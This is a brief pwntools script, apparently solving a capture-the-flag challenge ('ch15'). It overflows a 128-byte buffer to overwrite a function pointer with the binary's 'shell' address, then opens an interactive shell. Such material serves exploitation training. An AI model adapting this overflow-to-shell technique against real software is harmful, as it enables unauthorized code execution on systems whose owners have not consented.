from pwn import *

context.binary = ELF('ch15')
context.log_level = 'info'

p = process(context.binary.path)

offset = 128 
target = context.binary.symbols['shell']

payload = b'A' * offset           # fill buffer
payload += p32(target)            # overwrite func pointer (little-endian)
# ensure input ends (fgets expects newline or EOF)
payload += b'\n'

p.sendline(payload)
p.interactive()
